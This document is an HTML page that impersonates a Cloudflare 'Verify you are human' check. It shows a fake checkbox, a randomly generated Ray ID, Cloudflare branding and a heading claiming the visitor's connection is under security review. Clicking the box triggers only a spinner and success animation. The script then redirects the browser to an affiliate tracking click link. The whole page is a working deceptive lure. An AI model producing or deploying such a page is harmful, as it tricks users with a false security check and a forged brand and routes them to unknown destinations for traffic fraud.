<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Just a moment...</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: #fff;
            color: #1d1d1d;
            font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        .main-container {
            width: 100%;
            max-width: 600px;
            padding: 20px;
            box-sizing: border-box;
        }

        h1 {
            font-size: 24px;
            font-weight: 500;
            margin-bottom: 12px;
            margin-top: 0;
        }

        p {
            font-size: 15px;
            color: #595959;
            margin-top: 0;
            margin-bottom: 30px;
            line-height: 1.5;
        }

        .cf-turnstile-box {
            width: 300px;
            height: 65px;
            border: 1px solid #e0e0e0;
            border-radius: 4px;
            background-color: #fafafa;
            box-shadow: 0px 0px 4px rgba(0,0,0,0.02);
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 0 12px;
            box-sizing: border-box;
            user-select: none;
        }

        .left-section {
            display: flex;
            align-items: center;
            gap: 12px;
            cursor: pointer;
        }

        .check-box {
            width: 28px;
            height: 28px;
            border: 2px solid #c1c1c1;
            background-color: #fff;
            border-radius: 3px;
            box-sizing: border-box;
            transition: border-color 0.2s;
        }

        .left-section:hover .check-box {
            border-color: #999;
        }

        .verify-text {
            font-size: 14px;
            font-weight: 400;
            color: #1d1d1d;
        }

        .right-section {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }

        .cf-logo-svg {
            width: 24px;
            height: 24px;
            margin-bottom: -2px;
        }

        .cf-text {
            font-size: 9px;
            color: #1d1d1d;
            font-weight: 500;
            margin-bottom: 2px;
        }

        .privacy-terms {
            font-size: 8px;
            color: #7d7d7d;
        }

        .privacy-terms a {
            color: #7d7d7d;
            text-decoration: none;
        }

        .privacy-terms a:hover {
            text-decoration: underline;
        }

        .spinner {
            width: 28px;
            height: 28px;
            border: 3px solid #e0e0e0;
            border-top-color: #555;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            display: none;
            box-sizing: border-box;
        }

        .success-icon {
            width: 28px;
            height: 28px;
            background-color: #0b9e43;
            border-radius: 50%;
            display: none;
            align-items: center;
            justify-content: center;
            animation: popIn 0.3s ease-out forwards;
        }

        .success-icon svg {
            width: 14px;
            height: 14px;
            stroke: #fff;
            stroke-width: 3.5;
            fill: none;
            stroke-linecap: round;
            stroke-linejoin: round;
        }

        @keyframes spin {
            from { transform: rotate(0deg); }
            to { transform: rotate(360deg); }
        }

        @keyframes popIn {
            0% { transform: scale(0.5); opacity: 0; }
            80% { transform: scale(1.05); opacity: 1; }
            100% { transform: scale(1); opacity: 1; }
        }

        .footer {
            margin-top: 40px;
            border-top: 1px solid #e0e0e0;
            padding-top: 16px;
            font-size: 13px;
            color: #595959;
            display: flex;
            flex-direction: column;
            gap: 8px;
        }

        .footer-logo {
            color: #1d1d1d;
            font-weight: 500;
        }
    </style>
</head>
<body>

<div class="main-container">
    <h1 id="domain-heading">Verify you are human</h1>
    <p>Please stand by, while we are checking your browser...</p>

    <div class="cf-turnstile-box" onclick="startVerification()">
        <div class="left-section">
            <div class="check-box" id="checkbox"></div>
            <div class="spinner" id="spinner"></div>
            <div class="success-icon" id="success">
                <svg viewBox="0 0 24 24">
                    <path d="M4.5 12.75l6 6 9-13.5" />
                </svg>
            </div>
            <div class="verify-text" id="verify-text">Verify you are human</div>
        </div>
        <div class="right-section">
            <svg class="cf-logo-svg" viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
                <path d="M22.95 12.16c-.72-3.14-3.52-5.46-6.95-5.46-3.05 0-5.69 1.84-6.66 4.47-3.23.23-5.78 2.89-5.78 6.17 0 3.42 2.78 6.19 6.2 6.19h13.29c2.59 0 4.69-2.1 4.69-4.69 0-2.5-1.93-4.54-4.38-4.68h-.41z" fill="#f38020"/>
            </svg>
            <div class="cf-text">Cloudflare</div>
            <div class="privacy-terms">
                <a href="#">Privacy</a> · <a href="#">Terms</a>
            </div>
        </div>
    </div>

    <div class="footer">
        <div>Ray ID: <span id="ray-id"></span></div>
        <div>Performance &amp; security by <span class="footer-logo">Cloudflare</span></div>
    </div>
</div>

<script>
    document.addEventListener('DOMContentLoaded', () => {
        document.getElementById('ray-id').innerText = Array.from({length: 16}, () => '0123456789abcdef'[Math.floor(Math.random()*16)]).join('');
        document.getElementById('domain-heading').innerText = window.location.hostname + " needs to review the security of your connection before proceeding.";
    });
    
    let isVerifying = false;
    let isVerified = false;

    function startVerification() {
        if (isVerifying || isVerified) return;
        isVerifying = true;

        const checkbox = document.getElementById('checkbox');
        const spinner = document.getElementById('spinner');
        const success = document.getElementById('success');

        checkbox.style.display = 'none';
        spinner.style.display = 'block';

        setTimeout(() => {
            spinner.style.display = 'none';
            success.style.display = 'flex';
            isVerified = true;

            setTimeout(() => {
                window.location.href = "https://rainmaker49.gotrackier.com/click?campaign_id=8799&pub_id=545";
            }, 500);
        }, 1500 + Math.random() * 1000); 
    }
</script>

</body>
</html>
